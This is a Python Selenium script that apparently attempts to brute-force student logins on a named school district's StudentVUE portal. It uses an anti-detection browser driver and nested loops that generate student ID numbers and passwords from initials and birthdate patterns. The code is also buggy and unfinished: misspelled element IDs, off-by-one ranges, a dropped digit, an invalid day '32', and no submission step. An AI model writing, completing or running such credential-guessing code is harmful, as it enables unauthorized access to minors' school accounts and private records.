from selenium import webdriver
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
import time
import random
import json


month = ['01', '02', '03', '04', '05', '06',
         '07', '08', '09', '10', '11', '12']
day = ['01', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16',
       '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31', '32']
year = ['03', '04', '05', '06', '07', '08', '09']
code = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
inital = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
          'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

count = 0
driver = uc.Chrome(use_subprocess=True)
url = "https://studentvue.guhsdaz.org/PXP2_Login_Student.aspx?regenerateSessionId=True"
filename = "accounts.json"

username = 's'
password = 'x'


driver.find_element(
    By.ID, "ct100MainContent$username").send_keys(f'{username}')
driver.find_element(
    By.NAME, "ct100MainContent$password").send_keys(f'{password}')
input()
driver.quit()


def crackUser():
    user = ['0', '1', '2', '3', '4', '5',
            '6', '7', '8', "@student.guhsdaz.org"]
    for x in range(0, 9):
        for d in range(0, 9):
            for z in range(0, 9):
                for y in range(0, 9):
                    for w in range(0, 9):
                        for q in range(0, 9):
                            for l in range(0, 9):
                                for i in range(0, 9):
                                    for h in range(0, 9):
                                        user[0] = code[x]
                                        user[1] = code[d]
                                        user[2] = code[z]
                                        user[3] = code[y]
                                        user[4] = code[w]
                                        user[5] = code[q]
                                        user[6] = code[l]
                                        user[7] = code[i]
                                        user[8] = code[h]
                                        userName = user[0]+user[1]+user[3]+user[4] + \
                                            user[5]+user[6]+user[7] + \
                                            user[8]+user[9]
                                        password = ['0', '1', '2', '4']
                                        for p in range(0, 4):
                                            for g in range(0, 4):
                                                for k in range(0, 4):
                                                    for t in range(0, 4):
                                                        for v in range(0, 4):
                                                            password[0] = inital[p] + \
                                                                inital[g]
                                                            password[1] = month[k]
                                                            password[2] = day[t]
                                                            password[3] = year[v]
                                                            passWord = password[0] + \
                                                                password[1] + \
                                                                password[2] + \
                                                                password[3]


# crackUser()
